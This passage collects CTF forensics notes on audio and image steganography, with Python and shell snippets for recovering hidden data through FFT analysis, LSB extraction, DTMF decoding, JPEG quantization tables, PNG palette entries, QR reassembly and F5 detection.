- [Custom Frequency DTMF / Dual-Tone Keypad Encoding (EHAX 2026)](#custom-frequency-dtmf--dual-tone-keypad-encoding-ehax-2026)
- [Multi-Track Audio Differential Subtraction (EHAX 2026)](#multi-track-audio-differential-subtraction-ehax-2026)
- [Cross-Channel Multi-Bit LSB Steganography (ApoorvCTF 2026)](#cross-channel-multi-bit-lsb-steganography-apoorvctf-2026)
- [Audio FFT Musical Note Identification (BYPASS CTF 2025)](#audio-fft-musical-note-identification-bypass-ctf-2025)
- [Audio Metadata Octal Encoding (BYPASS CTF 2025)](#audio-metadata-octal-encoding-bypass-ctf-2025)
- [Nested Tar Archive with Whitespace Encoding (UTCTF 2026)](#nested-tar-archive-with-whitespace-encoding-utctf-2026)
- [Audio Waveform Binary Encoding (BackdoorCTF 2013)](#audio-waveform-binary-encoding-backdoorctf-2013)
- [Audio Spectrogram Hidden QR Code (BaltCTF 2013)](#audio-spectrogram-hidden-qr-code-baltctf-2013)

---

## FFT Frequency Domain Steganography (Pragyan 2026)

**Pattern (H@rDl4u6H):** Image encodes data in frequency domain via 2D FFT.

**Decoding workflow:**
```python
import numpy as np
from PIL import Image

img = np.array(Image.open("image.png")).astype(float)
F = np.fft.fftshift(np.fft.fft2(img))
mag = np.log(1 + np.abs(F))

# Look for patterns: concentric rings, dots at specific positions
# Bright peak = 0 bit, Dark (no peak) = 1 bit
cy, cx = mag.shape[0]//2, mag.shape[1]//2
radii = [100 + 69*i for i in range(21)]  # Example spacing
angles = [0, 22.5, 45, 67.5, 90, 112.5, 135, 157.5]
THRESHOLD = 13.0

bits = []
for r in radii:
    byte_val = 0
    for a in angles:
        fx = cx + r * np.cos(np.radians(a))
        fy = cy - r * np.sin(np.radians(a))
        bit = 0 if mag[int(round(fy)), int(round(fx))] > THRESHOLD else 1
        byte_val = (byte_val << 1) | bit
    bits.append(byte_val)
```

**Identification:** Challenge mentions "transform", poem about "frequency", or image looks blank/noisy. Try FFT visualization first.

---

## SSTV Red Herring + LSB Audio Stego (0xFun 2026)

**Pattern (Melodie):** WAV contains SSTV signal (Scottie 1) that decodes to "SEEMS LIKE A DEADEND". Real flag in 2-bit LSB of audio samples.

```bash
# Decode SSTV (red herring)
qsstv  # Will show decoy message

# Extract real flag from LSB
pip install stego-lsb
stegolsb wavsteg -r -i audio.wav -o out.bin -n 2 -b 1000
```

**Lesson:** Obvious signals may be decoys. Always check LSB even when another encoding is found.

---

## DotCode Barcode via SSTV (0xFun 2026)

**Pattern (Dots):** SSTV decoding produces dot pattern image. Not QR — it's DotCode format.

**Identification:** Dot pattern that isn't a standard QR code. DotCode is a 2D barcode optimized for high-speed printing.

**Tool:** Aspose online DotCode reader (free).

---

## DTMF Audio Decoding

**Pattern (Phone Home):** Audio file contains phone dialing tones encoding data.

```bash
# Decode DTMF tones
sox phonehome.wav -t raw -r 22050 -e signed-integer -b 16 -c 1 - | \
    multimon-ng -t raw -a DTMF -
```

**Post-processing:** Phone number may contain octal-encoded ASCII after delimiter (#):
```python
# Convert octal groups to ASCII
octal_groups = ["115", "145", "164", "141"]  # M, e, t, a
flag = ''.join(chr(int(g, 8)) for g in octal_groups)
```

---

## Custom Frequency DTMF / Dual-Tone Keypad Encoding (EHAX 2026)

**Pattern (Quantum Message):** Audio with dual-tone sequences at non-standard frequencies, aligned at regular intervals (e.g., every 1 second). Hints about "harmonic oscillators" or physics point to custom frequency design.

**Identification:** Spectrogram shows two distinct frequency sets that don't match standard DTMF (697-1633 Hz). Look for evenly-spaced rows/columns of frequency tones.

**Decoding workflow:**
```python
import numpy as np
from scipy.io import wavfile

rate, audio = wavfile.read('challenge.wav')

# 1. Generate spectrogram to identify frequency grid
# Use ffmpeg: ffmpeg -i challenge.wav -lavfi showspectrumpic=s=1920x1080 spec.png

# 2. Map frequencies to keypad (custom grid, NOT standard DTMF)
# Example: rows = [301, 902, 1503, 2104] Hz, cols = [2705, 3306, 3907] Hz
# Forms 4x3 keypad -> digits 0-9 + symbols

# 3. Extract tone pairs per time window
window_size = rate  # 1 second per symbol
for i in range(0, len(audio), window_size):
    segment = audio[i:i+window_size]
    freqs = np.fft.rfftfreq(len(segment), 1/rate)
    magnitude = np.abs(np.fft.rfft(segment))
    # Find two dominant peaks -> map to row/col -> digit

# 4. Convert digit sequence to ASCII
# Split digits into variable-length groups (ASCII range 32-126)
# E.g., "72101108108111" -> [72, 101, 108, 108, 111] -> "Hello"
def digits_to_ascii(digits):
    result, i = [], 0
    while i < len(digits):
        for length in [2, 3]:  # ASCII codes are 2-3 digits
            if i + length <= len(digits):
                val = int(digits[i:i+length])
                if 32 <= val <= 126:
                    result.append(chr(val))
                    i += length
                    break
        else:
            i += 1
    return ''.join(result)
```

**Key insight:** When tones don't match standard DTMF frequencies, generate a spectrogram first to identify the custom frequency grid. The mapping is challenge-specific.

---

## Multi-Track Audio Differential Subtraction (EHAX 2026)

**Pattern (Penguin):** MKV/video file with two nearly-identical audio tracks. Hidden data is embedded as a tiny difference between the tracks, invisible when listening to either individually.

**Identification:**
- `ffprobe` reveals multiple audio streams (e.g., two stereo FLAC tracks)
- Metadata may contain a decoy flag (e.g., in comments)
- Track labels may be misleading (e.g., stereo labeled as "5.1 surround")
- `sox --info` / `sox -n stat` shows nearly identical RMS, amplitude, and frequency statistics for both tracks

**Extraction workflow:**
```bash
# 1. Extract both audio tracks
ffmpeg -i challenge.mkv -map 0:a:0 -c copy track0.flac
ffmpeg -i challenge.mkv -map 0:a:1 -c copy track1.flac

# 2. Convert to WAV for processing
ffmpeg -i track0.flac track0.wav
ffmpeg -i track1.flac track1.wav

# 3. Subtract: invert one track and mix (cancels shared content)
sox -m track0.wav "|sox track1.wav -p vol -1" diff.wav

# 4. Normalize the difference signal
sox diff.wav diff_norm.wav gain -n -3

# 5. Generate spectrogram to read the flag
sox diff_norm.wav -n spectrogram -o spectrogram.png -X 2000 -Y 1000 -z 100 -h

# 6. Optional: filter to isolate flag frequency range
sox diff_norm.wav filtered.wav sinc 5000-12000
sox filtered.wav -n spectrogram -o filtered_spec.png -X 2000 -Y 1000 -z 100 -h
```

**Key insight:** When two audio tracks are nearly identical, subtracting one from the other (phase inversion + mix) cancels shared content and isolates hidden data. The flag is typically encoded as text in the spectrogram of the difference signal, visible in a specific frequency band (e.g., 5-12 kHz).

**Common traps:**
- Decoy flags in metadata/comments — always verify
- Mislabeled channel configurations (stereo as 5.1)
- Flag may only be visible in a narrow time window — use high-resolution spectrogram (`-X 2000+`)

---

## Cross-Channel Multi-Bit LSB Steganography (ApoorvCTF 2026)

**Pattern (Beneath the Armor):** Standard LSB tools (zsteg, stegsolve) fail because different bit positions are used per RGB channel: Red channel bit 0, Green channel bit 1, Blue channel bit 2.

```python
from PIL import Image

img = Image.open("challenge.png")
pixels = img.load()
bits = []
for y in range(img.height):
    for x in range(img.width):
        r, g, b = pixels[x, y][:3]
        bits.append((r >> 0) & 1)  # Red: bit 0
        bits.append((g >> 1) & 1)  # Green: bit 1
        bits.append((b >> 2) & 1)  # Blue: bit 2

# Pack 3 bits per pixel into bytes
data = bytearray()
for i in range(0, len(bits) - 7, 8):
    byte = 0
    for j in range(8):
        byte = (byte << 1) | bits[i + j]
    data.append(byte)
print(data.decode('ascii', errors='ignore'))
```

**Key insight:** When standard LSB tools find nothing, the data may use different bit positions per channel. The hint "cycles" or "modular" suggests cycling through bit positions (0→1→2) across channels. Always try non-standard bit combinations: R[0]G[1]B[2], R[1]G[2]B[0], R[2]G[0]B[1], etc.

**Detection:** Standard `zsteg -a` and `stegsolve` produce no results on an image that metadata hints contain hidden data.

---

## Audio FFT Musical Note Identification (BYPASS CTF 2025)

**Pattern (Piano):** Identify dominant frequencies via FFT (Fast Fourier Transform), map to musical notes (A-G), then read the letter names as a word.

**Technique:** Perform FFT on audio, identify dominant frequencies, map to musical notes.

```python
import numpy as np
from scipy.io import wavfile

rate, audio = wavfile.read('challenge.wav')
if audio.ndim > 1:
    audio = audio[:, 0]  # mono

# FFT to find dominant frequencies
freqs = np.fft.rfftfreq(len(audio), 1/rate)
magnitude = np.abs(np.fft.rfft(audio))

# Find top peaks
peak_indices = np.argsort(magnitude)[-20:]
peak_freqs = sorted(set(round(freqs[i]) for i in peak_indices if freqs[i] > 20))

# Musical note frequency mapping (A4 = 440 Hz)
NOTE_FREQS = {
    'C4': 261.63, 'D4': 293.66, 'E4': 329.63, 'F4': 349.23,
    'G4': 392.00, 'A4': 440.00, 'B4': 493.88,
    'C5': 523.25, 'D5': 587.33, 'E5': 659.25, 'F5': 698.46,
    'G5': 783.99, 'A5': 880.00, 'B5': 987.77,
}

def freq_to_note(freq):
    return min(NOTE_FREQS.items(), key=lambda x: abs(x[1] - freq))[0]

notes = [freq_to_note(f) for f in peak_freqs]
# Extract letter names: B, A, D, F, A, C, E → "BADFACE"
answer = ''.join(n[0] for n in notes)
print(f"Notes: {notes}")
print(f"Answer: {answer}")
```

**Extract and examine audio metadata** using `exiftool audio.mp3` for encoded hints in comment fields (e.g., octal-separated values → base64 → decoded hint).

**Key insight:** Musical note names (A-G) can spell words. When a challenge involves music/piano, identify dominant frequencies via FFT and read the note letter names as text.

---

## Audio Metadata Octal Encoding (BYPASS CTF 2025)

**Pattern (Piano metadata):** Audio file metadata (exiftool comment field) contains underscore-separated numbers representing octal-encoded ASCII values (digits 0-7 only).

```python
# Extract and decode octal metadata
import subprocess, base64

# Get metadata comment
comment = "103_137_63_157_144_145_144_40_162_145_154_151_143"
octal_values = comment.split('_')
decoded = ''.join(chr(int(v, 8)) for v in octal_values)

# May decode to base64, requiring another layer
result = base64.b64decode(decoded).decode()
print(result)
```

**Key insight:** When metadata contains underscore-separated numbers, try octal (digits 0-7 only), decimal, or hex interpretation. Multi-layer encoding (octal → base64 → plaintext) is common.

---

## Nested Tar Archive with Whitespace Encoding (UTCTF 2026)

**Pattern (Silent Archive):** Deeply nested tar archives where data is encoded in whitespace characters (spaces, tabs, newlines) within file names or content.

**Detection:** Archive extracts to another archive (tar-in-tar chain). File content appears empty but contains invisible whitespace characters.

**Decoding workflow:**
```python
import tarfile
import os

# 1. Recursively extract nested tar archives
def extract_all(path, depth=0):
    if depth > 100:  # Guard against infinite nesting
        return
    if tarfile.is_tarfile(path):
        with tarfile.open(path) as tf:
            tf.extractall(f'layer_{depth}')
            for member in tf.getmembers():
                extract_all(f'layer_{depth}/{member.name}', depth + 1)

# 2. Collect whitespace from file names or content
whitespace_data = []
for root, dirs, files in os.walk('layer_0'):
    for f in files:
        path = os.path.join(root, f)
        with open(path, 'rb') as fh:
            content = fh.read()
            # Check for whitespace-only content
            if content.strip() == b'':
                for byte in content:
                    if byte == 0x20:  # space
                        whitespace_data.append('0')
                    elif byte == 0x09:  # tab
                        whitespace_data.append('1')

# 3. Convert binary from whitespace
bits = ''.join(whitespace_data)
message = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits)-7, 8))
print(message.decode(errors='replace'))
```

**Whitespace encoding variants:**
- Space = 0, Tab = 1 (binary encoding)
- Whitespace Steganography: trailing spaces/tabs at end of lines
- Zero-width characters (U+200B, U+200C, U+FEFF) in Unicode text
- Number of spaces between words encodes data

**Key insight:** "Silent" or "invisible" hints point to whitespace encoding. Use `xxd` or `cat -A` to reveal hidden whitespace characters. Deeply nested archives are misdirection — the data is in the whitespace, not the nesting depth.

---

## Audio Waveform Binary Encoding (BackdoorCTF 2013)

**Pattern:** WAV file contains two distinct waveform shapes representing binary 0 and 1. Group 8 bits into bytes and decode as ASCII.

```python
import wave, struct
wf = wave.open('audio.wav', 'rb')
frames = wf.readframes(wf.getnframes())
samples = struct.unpack(f'{len(frames)//2}h', frames)

# Identify two distinct wave patterns (e.g., positive peak vs flat)
# Segment audio into fixed-length windows, classify each as 0 or 1
bits = ''
window = len(samples) // num_bits
for i in range(num_bits):
    segment = samples[i*window:(i+1)*window]
    bits += '1' if max(segment) > threshold else '0'

# Decode binary to ASCII
flag = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits)-7, 8))
```

**Key insight:** Open in Audacity and zoom in — two visually distinct wave patterns alternate. Each pattern represents one bit. Count the patterns, group into 8-bit bytes, decode as ASCII.

---

## Audio Spectrogram Hidden QR Code (BaltCTF 2013)

**Pattern:** Audio file contains visual data hidden in the frequency domain, visible only in a spectrogram view.

```bash
# Generate spectrogram image
sox audio.mp3 -n spectrogram -o spec.png
# Or use Sonic Visualiser for interactive exploration

# Look for visual patterns in specific frequency bands (often 5-12 kHz)
# Extract/assemble QR code fragments from spectrogram
# Scan with: zbarimg assembled_qr.png
```

**Key insight:** Use Sonic Visualiser (Layer → Add Spectrogram) with adjustable window size and color mapping. QR codes or text often appear in the 2-15 kHz band. Multiple spectrogram fragments may need to be stitched together in an image editor before scanning.

---



# stego-image

# CTF Forensics - Image Steganography

Techniques specific to hiding data in image formats (JPEG, PNG, BMP, GIF). For non-image steganography (PDF, audio, terminal, text), see [steganography.md](steganography.md). For advanced techniques (FFT, SSTV, audio, video, JPEG XL), see [stego-advanced.md](stego-advanced.md) and [stego-advanced-2.md](stego-advanced-2.md).

## Table of Contents
- [JPEG Unused Quantization Table LSB Steganography (EHAX 2026)](#jpeg-unused-quantization-table-lsb-steganography-ehax-2026)
- [BMP Bitplane QR Code Extraction + Steghide (BYPASS CTF 2025)](#bmp-bitplane-qr-code-extraction--steghide-bypass-ctf-2025)
- [Image Jigsaw Puzzle Reassembly via Edge Matching (BYPASS CTF 2025)](#image-jigsaw-puzzle-reassembly-via-edge-matching-bypass-ctf-2025)
- [F5 JPEG DCT Coefficient Ratio Detection (ApoorvCTF 2026)](#f5-jpeg-dct-coefficient-ratio-detection-apoorvctf-2026)
- [PNG Unused Palette Entry Steganography (ApoorvCTF 2026)](#png-unused-palette-entry-steganography-apoorvctf-2026)
- [QR Code Tile Reconstruction (UTCTF 2026)](#qr-code-tile-reconstruction-utctf-2026)
- [Seed-Based Pixel Permutation + Multi-Bitplane QR (L3m0nCTF 2025)](#seed-based-pixel-permutation--multi-bitplane-qr-l3m0nctf-2025)
- [JPEG Thumbnail Pixel-to-Text Mapping (RuCTF 2013)](#jpeg-thumbnail-pixel-to-text-mapping-ructf-2013)
- [Conditional LSB Extraction — Near-Black Pixel Filter (BaltCTF 2013)](#conditional-lsb-extraction--near-black-pixel-filter-baltctf-2013)
- [JPEG Slack Space Steganography (BSidesSF 2025)](#jpeg-slack-space-steganography-bsidessf-2025)
- [Nearest-Neighbor Interpolation Steganography (BSidesSF 2025)](#nearest-neighbor-interpolation-steganography-bsidessf-2025)
- [RGB Parity Steganography (Break In 2016)](#rgb-parity-steganography-break-in-2016)
- [Pixel Coordinate Chain Steganography (H4ckIT CTF 2016)](#pixel-coordinate-chain-steganography-h4ckit-ctf-2016)
- [AVI Frame Differential Pixel Steganography (H4ckIT CTF 2016)](#avi-frame-differential-pixel-steganography-h4ckit-ctf-2016)

---

## JPEG Unused Quantization Table LSB Steganography (EHAX 2026)

**Pattern (Jpeg Soul):** "Insignificant" hint points to least significant bits in JPEG quantization tables (DQT). JPEG can embed DQT tables (ID 2, 3) that are never referenced by frame markers — invisible to renderers but carry hidden data.

**Detection:** JPEG has more DQT tables than components reference. Standard JPEG uses 2 tables (luminance + chrominance); extra tables with IDs 2, 3 are suspicious.

```python
from PIL import Image

img = Image.open('challenge.jpg')

# Access quantization tables (PIL exposes them as dict)
# Standard: tables 0 (luminance) and 1 (chrominance)
# Hidden: tables 2, 3 (unreferenced by SOF marker)
qtables = img.quantization

bits = []
for table_id in sorted(qtables.keys()):
    if table_id >= 2:  # Unused tables
        table = qtables[table_id]
        for i in range(64):  # 8x8 = 64 values per DQT
            bits.append(table[i] & 1)  # Extract LSB

# Convert bits to ASCII
flag = ''
for i in range(0, len(bits) - 7, 8):
    byte = int(''.join(str(b) for b in bits[i:i+8]), 2)
    if 32 <= byte <= 126:
        flag += chr(byte)
print(flag)
```

**Manual DQT extraction (when PIL doesn't expose all tables):**
```python
# Parse JPEG manually to find all DQT markers (0xFFDB)
data = open('challenge.jpg', 'rb').read()
pos = 0
while pos < len(data) - 1:
    if data[pos] == 0xFF and data[pos+1] == 0xDB:
        length = int.from_bytes(data[pos+2:pos+4], 'big')
        dqt_data = data[pos+4:pos+2+length]
        table_id = dqt_data[0] & 0x0F
        precision = (dqt_data[0] >> 4) & 0x0F  # 0=8-bit, 1=16-bit
        values = list(dqt_data[1:65]) if precision == 0 else []
        print(f"DQT table {table_id}: {values[:8]}...")
        pos += 2 + length
    else:
        pos += 1
```

**Key insight:** JPEG quantization tables are metadata — they survive recompression and most image processing. Unused table IDs (2-15) can carry arbitrary data without affecting the image.

---

## BMP Bitplane QR Code Extraction + Steghide (BYPASS CTF 2025)

**Pattern (Gold Challenge):** BMP image with QR code hidden in a specific bitplane. Extract the QR code to obtain a steghide password.

**Technique:** Extract individual bitplanes (bits 0-2) for each RGB channel, render as images, scan for QR codes.

```python
from PIL import Image
import numpy as np

img = Image.open('challenge.bmp')
pixels = np.array(img)

# Extract individual bitplanes
for ch_idx, ch_name in enumerate(['R', 'G', 'B']):
    for bit in range(3):  # Check bits 0, 1, 2
        channel = pixels[:, :, ch_idx]
        bit_plane = ((channel >> bit) & 1) * 255
        Image.fromarray(bit_plane.astype(np.uint8)).save(f'bit_{ch_name}_{bit}.png')

# Combined LSB across all channels
lsb_img = np.zeros_like(pixels)
for ch in range(3):
    lsb_img[:, :, ch] = (pixels[:, :, ch] & 1) * 255
Image.fromarray(lsb_img).save('lsb_all.png')
```

**Full attack chain:**
1. Extract bitplanes → find QR code in specific bitplane (often bit 1, not bit 0)
2. Scan QR with `zbarimg bit_G_1.png` → get steghide password
3. `steghide extract -sf challenge.bmp -p <password>` → extract hidden file

**Key insight:** Standard LSB (least significant bit) tools check bit 0 only. Hidden QR codes may be in bit 1 or bit 2 — always check multiple bitplanes systematically. BMP format preserves exact pixel values (no compression artifacts).

---

## Image Jigsaw Puzzle Reassembly via Edge Matching (BYPASS CTF 2025)

**Pattern (Jigsaw Puzzle):** Archive containing multiple puzzle piece images that must be reassembled into the original image. Reassembled image contains the flag (possibly ROT13 encoded).

**Technique:** Compute pixel intensity differences at shared edges between all piece pairs, then greedily place pieces to minimize total edge difference.

```python
from PIL import Image
import numpy as np
import os

# Load all pieces
pieces = {}
for f in sorted(os.listdir('pieces/')):
    pieces[f] = np.array(Image.open(f'pieces/{f}'))

piece_list = list(pieces.keys())
n = len(piece_list)
grid_size = int(n ** 0.5)  # e.g., 25 pieces → 5x5

# Calculate edge compatibility
def edge_diff(img1, img2, direction):
    if direction == 'right':
        return np.sum(np.abs(img1[:, -1].astype(int) - img2[:, 0].astype(int)))
    elif direction == 'bottom':
        return np.sum(np.abs(img1[-1, :].astype(int) - img2[0, :].astype(int)))

# Build compatibility matrices
right_compat = np.full((n, n), float('inf'))
bottom_compat = np.full((n, n), float('inf'))
for i in range(n):
    for j in range(n):
        if i != j:
            right_compat[i, j] = edge_diff(pieces[piece_list[i]], pieces[piece_list[j]], 'right')
            bottom_compat[i, j] = edge_diff(pieces[piece_list[i]], pieces[piece_list[j]], 'bottom')

# Greedy placement
grid = [[None] * grid_size for _ in range(grid_size)]
used = set()
for row in range(grid_size):
    for col in range(grid_size):
        best_piece, best_diff = None, float('inf')
        for idx in range(n):
            if idx in used:
                continue
            diff = 0
            if col > 0:
                diff += right_compat[grid[row][col-1], idx]
            if row > 0:
                diff += bottom_compat[grid[row-1][col], idx]
            if diff < best_diff:
                best_diff, best_piece = diff, idx
        grid[row][col] = best_piece
        used.add(best_piece)

# Reassemble
piece_h, piece_w = pieces[piece_list[0]].shape[:2]
final = Image.new('RGB', (grid_size * piece_w, grid_size * piece_h))
for row in range(grid_size):
    for col in range(grid_size):
        final.paste(Image.open(f'pieces/{piece_list[grid[row][col]]}'),
                     (col * piece_w, row * piece_h))
final.save('reassembled.png')
```

**Post-processing:** Check if reassembled image text is ROT13 encoded. Decode with `tr 'A-Za-z' 'N-ZA-Mn-za-m'`.

**Key insight:** Edge-matching works by minimizing pixel differences at shared borders. The greedy approach (place piece with smallest total edge difference to already-placed neighbors) works well for most CTF puzzles. For harder puzzles, add backtracking.

---

## F5 JPEG DCT Coefficient Ratio Detection (ApoorvCTF 2026)

**Pattern (Engraver's Fault):** Detect F5 steganography in JPEG images by analyzing DCT coefficient distributions. F5 decrements ±1 AC coefficients toward 0, creating a measurable ratio shift.

**Detection metric — ±1/±2 AC coefficient ratio:**
```python
import numpy as np
from PIL import Image
import jpegio  # or use jpeg_toolbox

def f5_ratio(jpeg_path):
    """Ratio below 0.15 indicates F5 modification; above 0.20 indicates clean."""
    jpg = jpegio.read(jpeg_path)
    coeffs = jpg.coef_arrays[0].flatten()  # Luminance Y channel
    coeffs = coeffs[coeffs != 0]  # Remove DC/zeros
    count_1 = np.sum(np.abs(coeffs) == 1)
    count_2 = np.sum(np.abs(coeffs) == 2)
    return count_1 / max(count_2, 1)
```

**Sparse image edge case:** Images with >80% zero DCT coefficients give misleading ±1/±2 ratios. Use a secondary metric:
```python
def f5_sparse_check(jpeg_path):
    """For sparse images, ±2/±3 ratio below 2.5 indicates modification."""
    jpg = jpegio.read(jpeg_path)
    coeffs = jpg.coef_arrays[0].flatten()
    count_2 = np.sum(np.abs(coeffs) == 2)
    count_3 = np.sum(np.abs(coeffs) == 3)
    return count_2 / max(count_3, 1)

# Combined classifier:
r12 = f5_ratio(path)
r23 = f5_sparse_check(path)
is_modified = r12 < 0.15 or (r12 < 0.25 and r23 < 2.5)
```

**Key insight:** F5 steganography shifts ±1 coefficients toward 0, reducing the ±1/±2 ratio. Natural JPEGs have ratio 0.25-0.45; F5-modified drop below 0.10. Sparse images (mostly flat/white) need the secondary ±2/±3 metric because their ±1 counts are inherently low.

---

## PNG Unused Palette Entry Steganography (ApoorvCTF 2026)

**Pattern (The Gotham Files):** Paletted PNG (8-bit indexed color) hides data in palette entries that no pixel references. The image uses indices 0-199 but the PLTE chunk has 256 entries — indices 200-255 contain hidden ASCII in their red channel values.

```python
from PIL import Image
import struct

def extract_unused_plte(png_path):
    img = Image.open(png_path)
    palette = img.getpalette()  # Flat list: [R0,G0,B0, R1,G1,B1, ...]
    pixels = list(img.getdata())
    used_indices = set(pixels)

    # Extract red channel from unused palette entries
    flag = ''
    for i in range(256):
        if i not in used_indices:
            r = palette[i * 3]  # Red channel
            if 32 <= r <= 126:
                flag += chr(r)
    return flag
```

**Key insight:** PNG palette can have up to 256 entries but images typically use fewer. Unused entries are invisible to viewers but persist in the file. Metadata hints like "collector", "the entries that don't make it to the page", or "red light" point to this technique. Always check which palette indices are actually referenced vs. allocated.

---

## QR Code Tile Reconstruction (UTCTF 2026)

**Pattern (QRecreate):** QR code split into tiles/pieces that must be reassembled. Tiles may be scrambled, rotated, or have missing alignment patterns.

**Reconstruction workflow:**
```python
from PIL import Image
import numpy as np

# Load scrambled tiles
tiles = []
for i in range(N_TILES):
    tile = Image.open(f'tile_{i}.png')
    tiles.append(np.array(tile))

# Strategy 1: Edge matching (like jigsaw puzzle)
# Each tile edge has a unique bit pattern — match adjacent edges
def edge_signature(tile, side):
    if side == 'top': return tuple(tile[0, :].flatten())
    if side == 'bottom': return tuple(tile[-1, :].flatten())
    if side == 'left': return tuple(tile[:, 0].flatten())
    if side == 'right': return tuple(tile[:, -1].flatten())

# Strategy 2: QR structure constraints
# - Finder patterns (large squares) MUST be at 3 corners
# - Timing patterns (alternating B/W) run between finders
# - Use these as anchors to orient remaining tiles

# Strategy 3: Brute force small grids
# For 3x3 or 4x4 grids, try all permutations and scan with zbarimg
from itertools import permutations
import subprocess

grid_size = 3
tile_size = tiles[0].shape[0]
for perm in permutations(range(len(tiles))):
    img = Image.new('L', (grid_size * tile_size, grid_size * tile_size))
    for idx, tile_idx in enumerate(perm):
        row, col = divmod(idx, grid_size)
        img.paste(Image.fromarray(tiles[tile_idx]),
                  (col * tile_size, row * tile_size))
    img.save('/tmp/qr_attempt.png')
    result = subprocess.run(['zbarimg', '/tmp/qr_attempt.png'],
                          capture_output=True, text=True)
    if result.stdout.strip():
        print(f"DECODED: {result.stdout}")
        break
```

**Key insight:** QR codes have structural constraints (finder patterns, timing patterns, format info) that drastically reduce the search space. Use QR structure as anchors before brute-forcing tile positions.

---

## Seed-Based Pixel Permutation + Multi-Bitplane QR (L3m0nCTF 2025)

**Pattern (Lost Signal):** Image with randomized pixel colors hides a QR code. Pixels are visited in a seed-determined permutation order, and data is interleaved across multiple bitplanes of the luminance (Y) channel.

**Extraction workflow:**
1. Convert image to YCbCr and extract Y (luminance) channel
2. Generate the pixel visit order using the known seed
3. Extract LSB bits from multiple bitplanes in interleaved order
4. Reconstruct as a binary image and scan as QR code

```python
from PIL import Image
import numpy as np

SEED = 739391  # Given or brute-forced

# 1. Extract Y channel
img = Image.open("challenge.png").convert("YCbCr")
Y = np.array(img.split()[0], dtype=np.uint8)
h, w = Y.shape

# 2. Generate deterministic pixel permutation
rng = np.random.RandomState(SEED)
perm = np.arange(h * w)
rng.shuffle(perm)

# 3. Extract bits from multiple bitplanes (interleaved)
bitplanes = [0, 1]  # LSB0 and LSB1
total_bits = h * w
bits = np.zeros(total_bits, dtype=np.uint8)

for i in range(total_bits):
    pix_idx = perm[i // len(bitplanes)]
    bp = bitplanes[i % len(bitplanes)]
    y, x = divmod(pix_idx, w)
    bits[i] = (Y[y, x] >> bp) & 1

# 4. Reconstruct QR code
qr = bits.reshape((h, w))
qr_img = Image.fromarray((255 * (1 - qr)).astype(np.uint8))
qr_img.save("recovered_qr.png")
# zbarimg recovered_qr.png
```

**Key insight:** The seed defines a deterministic pixel visit order (Fisher-Yates shuffle via `RandomState`). Without the correct seed, output is random noise. Bits from different bitplanes are interleaved (bit 0 from pixel N, bit 1 from pixel N, bit 0 from pixel N+1, ...), doubling the data density. Try the Y (luminance) channel first — it has the highest contrast for hidden binary data.

**Seed recovery:** If the seed is unknown, look for it in: EXIF metadata, filename, image dimensions, challenge description numbers, or brute-force small ranges.

**Detection:** Image appears as random colored noise but has suspicious dimensions (perfect square, power of 2). Challenge mentions "seed", "random", or "signal".

---

## JPEG Thumbnail Pixel-to-Text Mapping (RuCTF 2013)

**Pattern:** JPEG contains an embedded thumbnail where dark pixels map 1:1 to character positions in visible text on the main image.

```python
from PIL import Image
# Extract thumbnail: exiftool -b -ThumbnailImage secret.jpg > thumb.jpg
thumb = Image.open('thumb.jpg')
text_lines = ["line1 of visible text...", "line2..."]  # OCR or type from photo
result = ''
for y in range(thumb.height):
    for x in range(thumb.width):
        r, g, b = thumb.getpixel((x, y))[:3]
        if r < 100 and g < 100 and b < 100:  # Dark pixel = selected char
            result += text_lines[y][x]
```

**Key insight:** Extract thumbnails with `exiftool -b -ThumbnailImage`. Dark pixels act as a selection mask over the photographed text. Use OCR (ABBYY FineReader, Tesseract) to get the text grid, then map dark thumbnail pixels to character positions.

---

## Conditional LSB Extraction — Near-Black Pixel Filter (BaltCTF 2013)

**Pattern:** Only pixels with R<=1 AND G<=1 AND B<=1 carry steganographic data. Standard LSB tools miss the data because they process all pixels.

```python
from PIL import Image
img = Image.open('image.png')
bits = ''
for pixel in img.getdata():
    r, g, b = pixel[0], pixel[1], pixel[2]
    if not (r <= 1 and g <= 1 and b <= 1):
        continue  # Skip non-carrier pixels
    bits += str(r & 1) + str(g & 1) + str(b & 1)
# Convert bits to bytes
flag = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits)-7, 8))
```

**Key insight:** When standard `zsteg`/`stegsolve` find nothing, try filtering pixels by value range before LSB extraction. The carrier pixels may be restricted to near-black, near-white, or specific color ranges.

---

## JPEG Slack Space Steganography (BSidesSF 2025)

JPEG compression pads images to 8x8 pixel block boundaries. Data hidden in the padding pixels beyond the visible image dimensions:

1. **Identify padded dimensions:** JPEG rounds up to nearest multiple of 8. A 253x195 image pads to 256x200
2. **Extract slack pixels:** Use tools to extend visible region to true block dimensions

```bash
# Extend image to see slack pixels
python3 jpeg_uncrop.py input.jpg --width 256 --height 200
# Or use ImageMagick to force full decode
magick input.jpg -define jpeg:size=256x200 extended.png
```

3. **Decode binary from slack pixels:** Black=0, white=1 in the padding region. Common encoding:
   - 2 bytes: magic number
   - 1 byte: key length
   - N bytes: encryption key
   - 1 byte: message length
   - N bytes: encrypted message

**Key insight:** Most image editors and viewers crop to the stated dimensions, hiding the padding. Use `jpegtran -crop` or raw DCT decoders to access full block data.

---

## Nearest-Neighbor Interpolation Steganography (BSidesSF 2025)

Hidden data encoded as a pixel grid at regular intervals within a high-resolution image. Downscaling with nearest-neighbor interpolation extracts only the hidden pixels:

```bash
# Hidden pixels spaced 16 apart in a 4096x3072 image
# Downscale by 16x with nearest-neighbor to recover 256x192 hidden image
magick flag.webp -interpolate nearest-neighbor -interpolative-resize 256x192 flag_visible.png
```

**Key insight:** Nearest-neighbor interpolation selects exact pixel values (no blending), preserving the hidden data. Bilinear or bicubic interpolation would average surrounding pixels, destroying the message. The challenge name or description often hints at the interpolation method.

**Detection:** Open in image viewer and zoom to see repeating pixel patterns at regular intervals. Calculate GCD of image dimensions and suspected grid spacing.

---

## RGB Parity Steganography (Break In 2016)

Hidden image encoded in the parity of pixel RGB sums. Sum R+G+B per pixel -- even sum = white, odd sum = black. Renders a binary bitmap containing the hidden message.

```python
from PIL import Image
img = Image.open('image.png')
out = Image.new('1', img.size)
for x in range(img.width):
    for y in range(img.height):
        r, g, b = img.getpixel((x, y))[:3]
        out.putpixel((x, y), (r + g + b) % 2)
out.save('hidden.png')
```

**Key insight:** Unlike LSB (Least Significant Bit) stego (single channel, single bit), parity stego uses the combined sum of all channels. Look for challenge hints about "pairs", "couples", or "adding colors".

